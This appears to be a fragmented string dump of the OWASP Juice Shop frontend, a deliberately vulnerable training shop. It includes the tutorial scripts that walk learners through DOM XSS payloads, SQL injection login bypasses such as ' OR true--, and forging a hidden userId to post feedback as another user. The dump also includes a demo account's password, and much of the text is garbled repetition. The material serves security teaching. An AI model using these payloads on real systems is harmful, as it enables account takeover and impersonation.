 }new fun ... \r\n    }this.ro ...  0.001;this.ro ... = 0.001this.rotationSpeedthis.am ... tHex();this.am ... etHex()this.am ... htColorambient ... etHex()ambient ... .getHexambientLight.colorthis.di ... tHex();this.di ... etHex()this.di ... htColordirecti ... etHex()directi ... .getHexdirecti ... t.coloraddCont ... ntrol);addCont ... ontrol)addStatsObject();addStatsObject()cameraB ... 10000);cameraB ...  10000)new THR ...  10000)-window.innerWidth-window.innerHeight-10000cameraB ... z = 50;cameraB ... .z = 50cameraBG.position.zcameraBG.positionsceneBG ... cene();sceneBG ... Scene()var mat ... lse });materia ... alse })new THR ... alse }){ map:  ... false }map: TH ... d.jpg")THREE.I ... d.jpg")"/asset ... nd.jpg"/assets/private/starry_background.jpg/assets/private/starry_backgroundvar bgP ... Color);bgPlane ... lColor)new THR ... lColor)new THR ... y(1, 1)bgPlane ... = -100;bgPlane ...  = -100bgPlane.position.zbgPlane.positionbgPlane ...  2, 1);bgPlane ... * 2, 1)bgPlane.scale.setbgPlane.scalewindow. ... dth * 2window. ... ght * 2sceneBG ... Plane);sceneBG.add(bgPlane)sceneBG.addvar bgP ... eraBG);bgPass  ... meraBG)new THR ... meraBG)var ren ... amera);renderP ... camera)renderP ...  false;renderP ... = falserenderPass.clearvar eff ... hader);effectC ... Shader)new THR ... Shader)effectC ... = true;effectC ...  = trueeffectC ... oScreencompose ... derer);compose ... nderer)new THR ... nderer)compose ... gPass);compose ... bgPass)composer.addPasscompose ... rPass);compose ... erPass)compose ... tCopy);compose ... ctCopy)documen ... ement);documen ... lement)documen ... ndChilddocument.bodyrenderer.domElementrender();render()functio ... ial;\r\n}{\r\n     ... ial;\r\n}var ora ... .jpg");orangeT ... k.jpg")THREE.I ... k.jpg")"/asset ... 2k.jpg"/assets/private/orangemap2k.jpg/assets/private/orangemap2kvar spe ... .jpg");specula ... k.jpg")"/asset ... 4k.jpg"/assets/private/earthspec4k.jpg/assets/private/earthspec4kvar nor ... .jpg");normalM ... k.jpg")/assets/private/earth_normalmap_flat4k.jpg/assets/private/earth_normalmap_flat4kvar ora ... rial();orangeM ... erial()orangeM ... exture;orangeM ... TextureorangeMaterial.maporangeM ... larMap;orangeM ... ularMaporangeM ... 62626);orangeM ... 262626)orangeM ... pecularnew THR ... 262626)2500134orangeM ... malMap;orangeM ... rmalMaporangeM ... , 0.7);orangeM ... 5, 0.7)orangeM ... alScalenew THR ... 5, 0.7)var clo ... .png");cloudTe ... k.png")THREE.I ... k.png")"/asset ... 4k.png"/assets/private/fair_clouds_4k.png/assets/private/fair_clouds_4kcloudMa ... exture;cloudMa ... TexturecloudMaterial.mapcloudMa ... = true;cloudMa ...  = truecloudMa ... sparentcloudMa ...  = 0.5;cloudMa ... y = 0.5cloudMa ... opacitycloudMa ... ending;cloudMa ... lendingfunctio ... r');\r\n}{\r\n     ... r');\r\n}var gui ... .GUI();gui = new dat.GUI()new dat.GUI()dat.GUIgui.add ...  0.01);gui.add ... , 0.01)gui.add-0.01gui.add ... olor');gui.add ... Color')gui.addColor'direct ... tColor'functio ... nt);\r\n}{\r\n     ... nt);\r\n}stats = new Stats();stats = new Stats()new Stats()stats.setMode(0);stats.setMode(0)stats.setModestats.d ... olute';stats.d ... solute'stats.d ... ositionstats.d ... t.stylestats.domElementstats.d ...  '0px';stats.d ... = '0px'stats.d ... le.leftstats.d ... yle.topfunctio ... er);\r\n}{\r\n     ... er);\r\n}stats.update();stats.update()stats.updatecameraC ... date();cameraC ... pdate()cameraControl.updatescene.g ... nSpeed;scene.g ... onSpeedscene.g ... ation.yscene.g ... otationscene.g ... earth')scene.g ... tByNamecontrol ... onSpeedscene.g ...  * 1.1;scene.g ... d * 1.1scene.g ... louds')control ... d * 1.1scene.g ... Color);scene.g ... tColor)scene.g ... ).colorscene.g ... bient')new THR ... tColor)control ... htColorscene.g ... ional')rendere ...  false;rendere ... = falserenderer.autoClearcomposer.render();composer.render()composer.renderrequest ... ender);request ... render)functio ... ht);\r\n}{\r\n     ... ht);\r\n}camera. ... Height;camera. ... rHeightcamera. ... trix();camera. ... atrix()window. ... = init;window.onload = initwindow.onloadwindow. ... false);window. ...  false)window. ... istener/assets/private/MaskPass.js/assets/private/ShaderPass.js/assets/private/CopyShader.js/assets/private/RenderPass.js/assets/private/EffectComposer.js/assets/private/stats.min.js/assets/private/dat.gui.min.js/assets/private/OrbitControls.js/assets/private/three.jsP:/My Drive/Git/juice-shop/frontend/src/assets/public/ContractABIs.tsP:/My Drive/Git/juice-shop/frontend/src/assets/publiccontractABI'spender''value''allowance''amount''account''decimals''uint8''subtractedValue''decreaseAllowance''addedValue''increaseAllowance''recipient''mintTokens''transfer''sender''getBalance''contract Token'export  ...  },\r\n];const n ...  },\r\n];nftABI  ...   },\r\n][\r\n  {\r ...   },\r\n]{\r\n     ... ',\r\n  }const c ...  },\r\n];contrac ...   },\r\n]name: 'spender'spendername: 'value'name: 'allowance'allowancename: 'amount'name: 'account'name: 'decimals'interna ... 'uint8'uint8type: 'uint8'name: ' ... dValue'subtractedValuename: ' ... owance'decreaseAllowancename: 'addedValue'addedValueincreaseAllowancename: 'recipient'recipientname: 'mintTokens'mintTokensname: 'transfer'transfername: 'sender'const B ...  },\r\n];BeeToke ...   },\r\n]BeeFauc ...   },\r\n]name: 'getBalance'interna ...  Token'contract Tokenconst w ...  },\r\n];web3Wal ...   },\r\n]P:/My Drive/Git/juice-shop/frontend/src/confetti/index.tsP:/My Drive/Git/juice-shop/frontend/src/confetticonfetti'canvas-confetti'"fixed""0""100%""none""2000"shootparticleCount2256000import  ... nfetti'const t ...   })\r\n}timeout ...   })\r\n}(ms: nu ...   })\r\n}{\r\n     ...   })\r\n}new Pro ... \n    })(resolv ... \r\n    }setTime ... lve,ms)export  ...   })\r\n}const s ...   })\r\n}shootCo ...   })\r\n}const c ... anvas')canvas  ... anvas')documen ... anvas')canvas. ... "fixed"canvas. ... ositioncanvas.stylecanvas. ... t = "0"canvas.style.leftcanvas.style.rightcanvas. ...  "100%"canvas.style.widthcanvas.style.heightcanvas. ...  "none"canvas. ... rEventscanvas. ...  "2000"canvas.style.zIndexdocumen ... canvas)const s ... \n    })shoot = ... \n    })confett ... \n    })confetti.createresize: trueshoot({ ... \n    })origin: ...       }x:1y:1particleCount: 225x:0timeout ... \n    })timeout(6000).thentimeout(6000)canvas.remove()canvas.removeP:/My Drive/Git/juice-shop/frontend/src/environments/environment.prod.tsP:/My Drive/Git/juice-shop/frontend/src/environmentsproductionexport  ...  '.'\r\n}const e ...  '.'\r\n}environ ...  '.'\r\n}{\r\n  pr ...  '.'\r\n}production: truehostServer: '.'P:/My Drive/Git/juice-shop/frontend/src/environments/environment.ts This file can be replaced during build by using the `fileReplacements` array.// This ...  array. `ng build ---prod` replaces `environment.ts` with `environment.prod.ts`.// `ng  ... od.ts`. The list of file replacements can be found in `angular.json`.// The  ... .json`.
 * In development mode, to ignore zone related error stack frames such as
 * `zone.run`, `zoneDelegate.invokeTask` for easier debugging, you can
 * import the following file, but please comment it out in production mode
 * because it will have performance impact when throw error
 /*\r\n *  ... or\r\n */ import 'zone.js/plugins/zone-error';  // Included with Angular CLI.// impo ... ar CLI.export  ... 000'\r\n}const e ... 000'\r\n}environ ... 000'\r\n}{\r\n  pr ... 000'\r\n}production: falsehostSer ... t:3000'P:/My Drive/Git/juice-shop/frontend/src/hacking-instructor/challenges/bonusPayload.tsP:/My Drive/Git/juice-shop/frontend/src/hacking-instructor/challengesP:/My Drive/Git/juice-shop/frontend/src/hacking-instructor TODO Add check if "DOM XSS" is solved and if not recommend doing that first// TODO ... t firstwaitForInputToHaveValuewaitForElementsInnerHtmlToBewaitInMs'../helpers/helpers'ChallengeInstruction'../'BonusPayloadInstruction'Assuming you did the **DOM XSS** tutorial already, this one just uses a funnier payload on the _Search_ field.''.fill-remaining-space'unskippableresolved'Enter or paste this payload into the _Search_ field: <code>&lt;iframe width=&quot;100%&quot; height=&quot;166&quot; scrolling=&quot;no&quot; frameborder=&quot;no&quot; allow=&quot;autoplay&quot; src=&quot;https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&amp;color=%23ff5500&amp;auto&lowbar;play=true&amp;hide&lowbar;related=false&amp;show&lowbar;comments=true&amp;show&lowbar;user=true&amp;show&lowbar;reposts=false&amp;show&lowbar;teaser=true&quot;&gt;&lt;/iframe&gt;</code>.''#searchQuery input''<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>''Make sure your speaker volume is cranked up. Then hit enter.''#searchValue'' Congratulations and enjoy the music!''.noResult'import  ... elpers'../helpers/helpers/helpers/helperswaitFor ... veValuewaitFor ... tmlToBeimport  ... m '../'../type Ch ... ructionexport  ... \n  ]\r\n}const B ... \n  ]\r\n}BonusPa ... \n  ]\r\n}BonusPa ... ruction{\r\n  na ... \n  ]\r\n}hints:  ...  }\r\n  ]text:\r\n ... field.''Assumi ... field.'Assuming you did the **DOM XSS** tutorial already, this one just uses a funnier payload on the _Search_ field.fixture ... -space''.fill- ... -space'.fill-remaining-spaceunskippable: trueresolve ... (10000)waitInMs(10000)text: ' ... code>.''Enter  ... code>.'Enter or paste this payload into the _Search_ field: <code>&lt;iframe width=&quot;100%&quot; height=&quot;166&quot; scrolling=&quot;no&quot; frameborder=&quot;no&quot; allow=&quot;autoplay&quot; src=&quot;https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&amp;color=%23ff5500&amp;auto&lowbar;play=true&amp;hide&lowbar;related=false&amp;show&lowbar;comments=true&amp;show&lowbar;user=true&amp;show&lowbar;reposts=false&amp;show&lowbar;teaser=true&quot;&gt;&lt;/iframe&gt;</code>.Enter or paste this payload into the _Search_ field: <code>&lt;iframe width=&quot;100%&quot; height=&quot;166&quot; scrolling=&quot;no&quot; frameborder=&quot;no&quot; allow=&quot;autoplay&quot; src=&quot;https://wcom/tracks/771984076&amp;color=%23ff5500&amp;auto&lowbar;play=true&amp;hide&lowbar;related=false&amp;show&lowbar;comments=true&amp;show&lowbar;user=true&amp;show&lowbar;reposts=false&amp;show&lowbar;teaser=true&quot;&gt;&lt;/iframe&gt;</code>resolve ... rame>')waitFor ... rame>')#searchQuery input<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://wcom/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>text: ' ... enter.''Make s ... enter.'Make sure your speaker volume is cranked up. Then hit enter.Make sure your speaker volume is cranked up Then hit enter#searchValuetext:\r\n ... music!''\u1f389\udf89 Con ... music!' Congratulations and enjoy the music!fixture: '.noResult'.noResultnoResultresolve ... s(5000)waitInMs(5000)P:/My Drive/Git/juice-shop/frontend/src/hacking-instructor/challenges/codingChallenges.ts FIXME The tutorial does not progress automatically. Workaround ^^^^^^^^^^^^^^^^ instruction above should be removed when fixed.waitForElementToGetClickedwaitForAngularRouteToBeVisitedCodingChallengesInstruction'Coding Challenges''To do the tutorial on _Coding Challenges_, you have to find and visit the _Score Board_ first. Once there, you have to click the tutorial button for the _Score Board_ challenge to proceed.'fixtureAfter'Many Juice Shop hacking challenges come with an associated _Coding Challenge_ which will teach you more about the underlying vulnerability on source code level.''#Score\\ Board\\.solved'15000'You can launch a Coding Challenge via the `<>`-button. Click the one for the _Score Board_ challenge now.''#codingChallengeTutorialButton''#Score\\ Board\\.codingChallengeButton''All Coding Challenges take place in a modal dialog like this. They consist of two parts, one for finding and one for fixing the vulnerability in the code.''#code-snippet''The code snippet below shows a part of the actual application source code retrieved in real-time.''You will always get a snippet that is involved in the security vulnerability or flaw behind the corresponding hacking challenge. In this case, you see the routing code that exposes all dialogs, including the supposedly "well-hidden" Score Board.'20000'For the "Find It" part of this coding challenge, tick the  on all lines of code that you think are responsible for exposing the Score Board. When done, click the _Submit_ button.''#line114''That\'s the one! Click the _Submit_ button proceed.''#findItSubmitButton''! You made it half-way through! In phase two you are now presented with several fix options. You must select the one which you think is the **best possible** fix for the security vulnerability.''This coding challenge is a bit "special", because the Score Board is crucial for progress tracking and acts as a hub for the other challenges. Keep that in mind when picking the _Correct Fix_ from the options _Fix 1_, _2_ and _3_.''#fixItSubmitButton''If you did\'nt get the answer right, just try again until the -cannon fires. Then click _Close_ to end the coding challenge and return to the Score Board.''#fixItCloseButton'waitFor ... ClickedwaitFor ... Visitedconst C ... \n  ]\r\n}CodingC ... \n  ]\r\n}CodingC ... ructionname: ' ... lenges'Coding Challengestext:\r\n ... oceed.''To do  ... oceed.'To do the tutorial on _Coding Challenges_, you have to find and visit the _Score Board_ first. Once there, you have to click the tutorial button for the _Score Board_ challenge to proceed.To do the tutorial on _Coding Challenges_, you have to find and visit the _Score Board_ first Once there, you have to click the tutorial button for the _Score Board_ challenge to proceedfixture ... navbar'fixtureAfter: trueresolve ... board')waitFor ... board')text:\r\n ... level.''Many J ... level.'Many Juice Shop hacking challenges come with an associated _Coding Challenge_ which will teach you more about the underlying vulnerability on source code level.Many Juice Shop hacking challenges come with an associated _Coding Challenge_ which will teach you more about the underlying vulnerability on source code levelfixture ... solved''#Score ... solved'#Score\ Board\.solved#Score\ Boardresolve ... (15000)waitInMs(15000)text:\r\n ... e now.''You ca ... e now.'You can launch a Coding Challenge via the `<>`-button. Click the one for the _Score Board_ challenge now.You can launch a Coding Challenge via the `<>`-button Click the one for the _Score Board_ challenge nowfixture ... Button''#codin ... Button'#codingChallengeTutorialButtonresolve ... utton')waitFor ... utton')'#Score ... Button'#Score\ Board\.codingChallengeButtoncodingChallengeButtontext:\r\n ...  code.''All Co ...  code.'All Coding Challenges take place in a modal dialog like this. They consist of two parts, one for finding and one for fixing the vulnerability in the code.All Coding Challenges take place in a modal dialog like this They consist of two parts, one for finding and one for fixing the vulnerability in the codefixture ... nippet'#code-snippettext:\r\n ... -time.''The co ... -time.'The code snippet below shows a part of the actual application source code retrieved in real-time.The code snippet below shows a part of the actual application source code retrieved in real-timetext:\r\n ... Board.''You wi ... Board.'You will always get a snippet that is involved in the security vulnerability or flaw behind the corresponding hacking challenge. In this case, you see the routing code that exposes all dialogs, including the supposedly "well-hidden" Score Board.You will always get a snippet that is involved in the security vulnerability or flaw behind the corresponding hacking challenge In this case, you see the routing code that exposes all dialogs, including the supposedly "well-hidden" Score Boardresolve ... (20000)waitInMs(20000)text:\r\n ... utton.''For th ... utton.'For the "Find It" part of this coding challenge, tick the  on all lines of code that you think are responsible for exposing the Score Board. When done, click the _Submit_ button.For the "Find It" part of this coding challenge, tick the  on all lines of code that you think are responsible for exposing the Score Board When done, click the _Submit_ buttonresolve ... ne114')waitFor ... ne114')#line114'That\' ... oceed.'That's the one! Click the _Submit_ button proceed.That's the one! Click the _Submit_ button proceed'#findI ... Button'#findItSubmitButtontext:\r\n ... ility.''\u1f38a\udf8a! Yo ... ility.'! You made it half-way through! In phase two you are now presented with several fix options. You must select the one which you think is the **best possible** fix for the security vulnerability.text:\r\n ... d _3_.''This c ... d _3_.'This coding challenge is a bit "special", because the Score Board is crucial for progress tracking and acts as a hub for the other challenges. Keep that in mind when picking the _Correct Fix_ from the options _Fix 1_, _2_ and _3_.This coding challenge is a bit "special", because the Score Board is crucial for progress tracking and acts as a hub for the other challenges Keep that in mind when picking the _Correct Fix_ from the options _Fix 1_, _2_ and _3_#fixItSubmitButton'If you ... Board.'If you did'nt get the answer right, just try again until the -cannon fires. Then click _Close_ to end the coding challenge and return to the Score Board.If you did'nt get the answer right, just try again until the -cannon fires Then click _Close_ to end the coding challenge and return to the Score Board#fixItCloseButtonP:/My Drive/Git/juice-shop/frontend/src/hacking-instructor/challenges/domXss.ts Browsers will autocorrect the unclosed tag.// Brow ... ed tag.DomXssInstruction"For this challenge, we'll take a close look at the _Search_ field at the top of the screen."8000"Let's start by searching for all products containing `owasp` in their name or description."'owasp''Now hit enter.''Nice! You should now see many cool OWASP-related products.''You might have noticed, that your search term is displayed above the results?''What we will try now is a **Cross-Site Scripting (XSS)** attack, where we try to inject HTML or JavaScript code into the application.''Change your search value into `<h1>owasp` to see if we can inject HTML.''<h1>owasp''Hit enter again.''<h1>owasp</h1>'"Hmm, this doesn't look normal, does it?"'If you right-click on the search term and inspect that part of the page with your browser, you will see that our `h1`-tag was _actually_ embedded into the page and is not just shown as plain text!'16000"Let's now try to inject JavaScript. Type `<script>alert(xss)</script>` into the search box now."'<script>alert(xss)</script>'" This didn't work as we hoped. If you inspect the page, you should see the `script`-tag but it is not executed for some reason.""Luckily there are _many_ different XSS payloads we can try. Let's try this one next: <code>&lt;iframe src=\"javascript:alert(&#96;xss&#96;)\"&gt;</code>."'<iframe src="javascript:alert(`xss`)">''Hit enter one more time. If an alert box appears, you must confirm it in order to close it.''<iframe src="javascript:alert(`xss`)"></iframe>'' Congratulations! You just successfully performed an XSS attack!''More precisely, this was a **DOM XSS** attack, because your payload was handled and improperly embedded into the page by the application frontend code without even sending it to the server.'const D ... \n  ]\r\n}DomXssI ... \n  ]\r\n}text:\r\n ... creen.""For th ... creen."For this challenge, we'll take a close look at the _Search_ field at the top of the screen.For this challenge, we'll take a close look at the _Search_ field at the top of the screenresolve ... s(8000)waitInMs(8000)text: " ... ption.""Let's  ... ption."Let's start by searching for all products containing `owasp` in their name or description.Let's start by searching for all products containing `owasp` in their name or descriptionresolve ... owasp')waitFor ... owasp')owaspNow hit enter.Now hit entertext: ' ... ducts.''Nice!  ... ducts.'Nice! You should now see many cool OWASP-related products.Nice! You should now see many cool OWASP-related productstext: ' ... sults?''You mi ... sults?'You might have noticed, that your search term is displayed above the results?You might have noticed, that your search term is displayed above the resultfixture ... result'text: ' ... ation.''What w ... ation.'What we will try now is a **Cross-Site Scripting (XSS)** attack, where we try to inject HTML or JavaScript code into the application.text: ' ...  HTML.''Change ...  HTML.'Change your search value into `<h1>owasp` to see if we can inject HTML.Change your search value into `<h1>owasp` to see if we can inject HTML<h1>owasptext: ' ... again.'Hit enter again.Hit enter againresolve ... </h1>')waitFor ... </h1>')<h1>owasp</h1>text: " ... es it?""Hmm, t ... es it?"Hmm, this doesn't look normal, does it?Hmm, this doesn't look normal, does itext: ' ...  text!''If you ...  text!'If you right-click on the search term and inspect that part of the page with your browser, you will see that our `h1`-tag was _actually_ embedded into the page and is not just shown as plain text!resolve ... (16000)waitInMs(16000)text: " ... x now.""Let's  ... x now."Let's now try to inject JavaScript. Type `<script>alert(xss)</script>` into the search box now.Let's now try to inject JavaScript Type `<script>alert(xss)xss</script>` into the search box nowresolve ... ript>')waitFor ... ript>')<script>alert(xss)</script>text: " ... eason.""\u1f614\ude14 Thi ... eason." This didn't work as we hoped. If you inspect the page, you should see the `script`-tag but it is not executed for some reason. This didn't work as we hoped If you inspect the page, you should see the `script`-tag but it is not executed for some reasontext: " ... code>.""Luckil ... code>."Luckily there are _many_ different XSS payloads we can try. Let's try this one next: <code>&lt;iframe src="javascript:alert(&#96;xss&#96;)"&gt;</code>.Luckily there are _many_ different XSS payloads we can try Let's try this one next: <code>&lt;iframe src="javascript:alert(&#96;xss&#96;)&#96;xss&#96;"&gt;</code>resolve ... s`)">')waitFor ... s`)">')'<ifram ... ss`)">'<iframe src="javascript:alert(`xss`)">text: ' ... se it.''Hit en ... se it.'Hit enter one more time. If an alert box appears, you must confirm it in order to close it.Hit enter one more time If an alert box appears, you must confirm it in order to close it<iframe src="javascript:alert(`xss`)"></iframe>"></iframe>text:\r\n ... ttack!''\u1f389\udf89 Con ... ttack!' Congratulations! You just successfully performed an XSS attack!text:\r\n ... erver.''More p ... erver.'More precisely, this was a **DOM XSS** attack, because your payload was handled and improperly embedded into the page by the application frontend code without even sending it to the server.P:/My Drive/Git/juice-shop/frontend/src/hacking-instructor/challenges/forgedFeedback.tswaitForDevToolsForgedFeedbackInstruction'To start this challenge, first go to the _Customer Feedback_ page.''This challenge is about broken access controls. To pass it, you need to impersonate another user while providing feedback.''If you would now submit feedback, it would be posted by yourself while logged in or anonymously while logged out.''We will now search for any mistake the application developers might have made in setting the author of any new feedback.'"Open the browser's _Development Tools_ and try finding anything interesting while inspecting the feedback form."'There is more than meets the eye among the fields of the form... '"Once you found the field that shouldn't even be there, try manipulating its value to one that might represent another user!"'userId''You found and changed the invisible `userId`! Now submit the form to complete the challenge.'' Congratulations, you successfully submitted a feedback as another user!'const F ... \n  ]\r\n}ForgedF ... \n  ]\r\n}ForgedF ... ructiontext:\r\n ...  page.''To sta ...  page.'To start this challenge, first go to the _Customer Feedback_ page.To start this challenge, first go to the _Customer Feedback_ pageresolve ... ntact')waitFor ... ntact')text:\r\n ... dback.''This c ... dback.'This challenge is about broken access controls. To pass it, you need to impersonate another user while providing feedback.This challenge is about broken access controls To pass it, you need to impersonate another user while providing feedbacktext:\r\n ... d out.''If you ... d out.'If you would now submit feedback, it would be posted by yourself while logged in or anonymously while logged out.If you would now submit feedback, it would be posted by yourself while logged in or anonymously while logged out'We wil ... dback.'We will now search for any mistake the application developers might have made in setting the author of any new feedback.We will now search for any mistake the application developers might have made in setting the author of any new feedbacktext:\r\n ...  form.""Open t ...  form."Open the browser's _Development Tools_ and try finding anything interesting while inspecting the feedback form.Open the browser's _Development Tools_ and try finding anything interesting while inspecting the feedback formresolve ... Tools()waitForDevTools()text:\r\n ... ... \u1f609\ude09''There  ... ... \u1f609\ude09'There is more than meets the eye among the fields of the form... There is more than meets the eye among the fields of the form text:\r\n ...  user!""Once y ...  user!"Once you found the field that shouldn't even be there, try manipulating its value to one that might represent another user!async r ...       }const u ... ).valueuserId  ... ).value(docume ... ).value(docume ... lement)documen ... serId')while ( ...       }if ((do ...       }(docume ...  userIdawait sleep(100)sleep(100)text:\r\n ... lenge.''You fo ... lenge.'You found and changed the invisible `userId`! Now submit the form to complete the challenge.You found and changed the invisible `userId`! Now submit the form to complete the challengetext:\r\n ...  user!''\u1f389\udf89 Con ...  user!' Congratulations, you successfully submitted a feedback as another user!P:/My Drive/Git/juice-shop/frontend/src/hacking-instructor/challenges/loginAdmin.tswaitForInputToNotBeEmptywaitForLogOutLoginAdminInstruction"To start this challenge, you'll have to log out first."'#navbarAccount'"Let's try if we find a way to log in with the administrator's user account. To begin, go to the _Login_ page via the _Account_ menu."'To find a way around the normal login process we will try to use a **SQL Injection** (SQLi) attack.''#email'"A good starting point for simple SQL Injections is to insert quotation marks (like `\"` or `'`). These mess with the syntax of an insecurely concatenated query and might give you feedback if an endpoint is vulnerable or not.""Start with entering `'` in the **email field**.""Now put anything in the **password field**. It doesn't matter what."'#password''Press the _Log in_ button.''#rememberMe''#loginButton'"Nice! Do you see the red `[object Object]` error at the top? Unfortunately it isn't really telling us much about what went wrong..."'Maybe you will be able to find out more information about the error in the JavaScript console or the network tab of your browser!''Did you spot the error message with the `SQLITE_ERROR` and the entire SQL query in the 500 response to `/login`? If not, keep the network tab open and click _Log in_ again. Then inspect the occuring response closely.'30000"Let's try to manipulate the query a bit to make it useful. Try out typing `' OR true` into the **email field**.""' OR true"'Now click the _Log in_ button again.''Mhh... The query is still invalid? Can you see why from the new error in the HTTP response?'"We need to make sure that the rest of the query after our injection doesn't get executed. Any Ideas?"'You can comment out anything after your injection payload from query using comments in SQL. In SQLite databases you can use `--` for that.'"So, type in `' OR true--` into the email field.""' OR true--"'Press the _Log in_ button again and sit back...''That worked, right?! To see with whose account you just logged in, open the _Account_ menu.'' Congratulations! You have been logged in as the **administrator** of the shop! (If you want to understand why, try to reproduce what your `\' OR true--` did _exactly_ to the query.)'waitFor ... BeEmptyconst L ... \n  ]\r\n}LoginAd ... \n  ]\r\n}LoginAd ... ructiontext:\r\n ... first.""To sta ... first."To start this challenge, you'll have to log out first.To start this challenge, you'll have to log out firstfixture ... ccount'#navbarAccountresolve ... ogOut()waitForLogOut()text:\r\n ...  menu.""Let's  ...  menu."Let's try if we find a way to log in with the administrator's user account. To begin, go to the _Login_ page via the _Account_ menu.Let's try if we find a way to log in with the administrator's user account To begin, go to the _Login_ page via the _Account_ menuresolve ... login')waitFor ... login')text: ' ... ttack.''To fin ... ttack.'To find a way around the normal login process we will try to use a **SQL Injection** (SQLi) attack.fixture: '#email'#emailtext: " ... r not.""A good ... r not."A good starting point for simple SQL Injections is to insert quotation marks (like `"` or `'`). These mess with the syntax of an insecurely concatenated query and might give you feedback if an endpoint is vulnerable or not.A good starting point for simple SQL Injections is to insert quotation marks (like `"` or `'`)like `"` or `'` These mess with the syntax of an insecurely concatenated query and might give you feedback if an endpoint is vulnerable or nottext: " ... eld**.""Start  ... eld**."Start with entering `'` in the **email field**.resolve ... ', "'")waitFor ... ', "'")text: " ...  what.""Now pu ...  what."Now put anything in the **password field**. It doesn't matter what.fixture: '#password'#passwordresolve ... sword')waitFor ... sword')text: ' ... utton.''Press  ... utton.'Press the _Log in_ button.Press the _Log in_ buttonfixture ... mberMe'#rememberMe#loginButtontext: " ... ong...""Nice!  ... ong..."Nice! Do you see the red `[object Object]` error at the top? Unfortunately it isn't really telling us much about what went wrong...Nice! Do you see the red `[object Object]` error at the top? Unfortunately it isn't really telling us much about what went wrongtext: ' ... owser!''Maybe  ... owser!'Maybe you will be able to find out more information about the error in the JavaScript console or the network tab of your browser!text: ' ... osely.''Did yo ... osely.'Did you spot the error message with the `SQLITE_ERROR` and the entire SQL query in the 500 response to `/login`? If not, keep the network tab open and click _Log in_ again. Then inspect the occuring response closely.Did you spot the error message with the `SQLITE_ERROR` and the entire SQL query in the 500 response to `/login`? If not, keep the network tab open and click _Log in_ again Then inspect the occuring response closelyresolve ... (30000)waitInMs(30000)"Let's  ... eld**."Let's try to manipulate the query a bit to make it useful. Try out typing `' OR true` into the **email field**.resolve ...  true")waitFor ...  true")' OR true'Now cl ... again.'Now click the _Log in_ button again.Now click the _Log in_ button againtext: ' ... ponse?''Mhh... ... ponse?'Mhh... The query is still invalid? Can you see why from the new error in the HTTP response?Mhh The query is still invali Can you see why from the new error in the HTTP response?text: " ... Ideas?""We nee ... Ideas?"We need to make sure that the rest of the query after our injection doesn't get executed. Any Ideas?We need to make sure that the rest of the query after our injection doesn't get executed Any Ideatext: ' ...  that.''You ca ...  that.'You can comment out anything after your injection payload from query using comments in SQL. In SQLite databases you can use `--` for that.You can comment out anything after your injection payload from query using comments in SQL In SQLite databases you can use `--` for thattext: " ... field.""So, ty ... field."So, type in `' OR true--` into the email field.So, type in `' OR true--` into the email fieldresolve ... rue--")waitFor ... rue--")' OR true--text: ' ... ack...''Press  ... ack...'Press the _Log in_ button again and sit back...Press the _Log in_ button again and sit backtext:\r\n ...  menu.''That w ...  menu.'That worked, right?! To see with whose account you just logged in, open the _Account_ menu.That worked, righ! To see with whose account you just logged in, open the _Account_ menuresolve ... count')waitFor ... count')text:\r\n ... uery.)''\u1f389\udf89 Con ... uery.)' Congratulations! You have been logged in as the **administrator** of the shop! (If you want to understand why, try to reproduce what your `' OR true--` did _exactly_ to the query.)P:/My Drive/Git/juice-shop/frontend/src/hacking-instructor/challenges/loginBender.ts TODO Add check if "Login Admin" is solved and if not recommend doing that firstwaitForInputToNotHaveValueAndNotBeEmptyLoginBenderInstruction"Let's try if we find a way to log in with Bender's user account. To begin, go to the _Login_ page via the _Account_ menu.""As you would expect you need to supply Bender's email address and password to log in regularly. But you might have neither at the moment."'If we had at least the email address, we could then try a **SQL Injection** (SQLi) attack to avoid having to supply a password.'"So, let's go find out Bender's email! Luckily the shop is very bad with privacy and leaks emails in different places, for instance in the user feedback."'Go to the _About Us_ page where user feedback is displayed among other things.''Once you found an entry by Bender in the feedback carousel leaking enough of his email to deduce the rest, go to the _Login_ screen.'"Supply Bender's email address in the **email field**."'bender@juice-sh.op'"Now put anything in the **password field**. Let's assume we don't know it yet, even if you happen to already do."'OhG0dPlease1nsertLiquor!'"This didn't work, but did you honestly expect it to? We need to craft an SQLi attack first!""You can comment out the entire password check clause of the DB query by adding `'--` to Bender's email address!""bender@juice-sh.op'--"' Congratulations! You have been logged in as Bender!'LoginBe ... \n  ]\r\n}LoginBe ... ructionLet's try if we find a way to log in with Bender's user account. To begin, go to the _Login_ page via the _Account_ menu.Let's try if we find a way to log in with Bender's user accounttext:\r\n ... oment.""As you ... oment."As you would expect you need to supply Bender's email address and password to log in regularly. But you might have neither at the moment.As you would expect you need to supply Bender's email address and password to log in regularly But you might have neither at the momenttext:\r\n ... sword.''If we  ... sword.'If we had at least the email address, we could then try a **SQL Injection** (SQLi) attack to avoid having to supply a password.text:\r\n ... dback.""So, le ... dback."So, let's go find out Bender's email! Luckily the shop is very bad with privacy and leaks emails in different places, for instance in the user feedback.So, let's go find out Bender's email! Luckily the shop is very bad with privacy and leaks emails in different places, for instance in the user feedbacktext:\r\n ... hings.''Go to  ... hings.'Go to the _About Us_ page where user feedback is displayed among other things.Go to the _About Us_ page where user feedback is displayed among other thingsresolve ... about')waitFor ... about')text:\r\n ... creen.''Once y ... creen.'Once you found an entry by Bender in the feedback carousel leaking enough of his email to deduce the rest, go to the _Login_ screen.Once you found an entry by Bender in the feedback carousel leaking enough of his email to deduce the rest, go to the _Login_ screenfixture: 'app-about'"Supply ... eld**."Supply Bender's email address in the **email field**.resolve ... in'] })waitFor ... in'] })bender@juice-sh.opbender@juice-sh{ repla ... ain'] }replace ... omain']['juice ... omain']text: " ... dy do.""Now pu ... dy do."Now put anything in the **password field**. Let's assume we don't know it yet, even if you happen to already do.resolve ... quor!')waitFor ... quor!')text: " ... first!""This d ... first!"This didn't work, but did you honestly expect it to? We need to craft an SQLi attack first!This didn't work, but did you honestly expect it to? We need to craft an SQLi attack first!text: " ... dress!""You 